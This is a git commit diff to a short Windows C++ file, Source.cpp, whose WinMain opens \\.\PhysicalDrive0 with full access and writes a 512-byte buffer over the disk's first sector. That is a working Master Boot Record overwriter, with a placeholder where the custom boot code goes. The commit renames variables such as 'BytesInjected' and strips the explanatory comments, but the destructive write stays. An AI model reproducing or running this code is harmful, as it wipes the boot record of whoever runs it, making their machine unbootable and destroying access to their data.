f9563ec0e60828ff57334ecefb95e53b7fcf52fd
Katie <diamondintheruffvendorevents@outlook.com>
2025-02-28 16:13:23 -0500

    Update Source.cpp

--- Source.cpp
+++ Source.cpp
@@ -4,21 +4,18 @@
 
 // Edit 01/01/2022, fixed shitty grammar from past
 
-const unsigned char MasterBootRecord[] = { /*your hex data goes here*/ };
+// Edit 02/28/2025, Updated a lot of things.
+
+const unsigned char HexData[] = { /*your hex data goes here*/ };
 
 int CALLBACK WinMain(
     HINSTANCE hInstance, HINSTANCE hPrevInstance,
     LPSTR     lpCmdLine, int       nCmdShow
 )
 {
-    // just open a handle to PhysicalDrive0, and we write our custom bootloader
-    // https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
-    DWORD dwBytesWritten;
-    HANDLE hDevice = CreateFileW(
-        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
-        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
-        OPEN_EXISTING, 0, 0);
+    DWORD BytesInjected;
+    HANDLE hNewFile = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 
-    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0); // write the file to the handle
-    CloseHandle(hDevice); // close the handle
+    WriteFile(hNewFile, HexData, 512, &BytesInjected, NULL); 
+    CloseHandle(hNewFile); 
 }
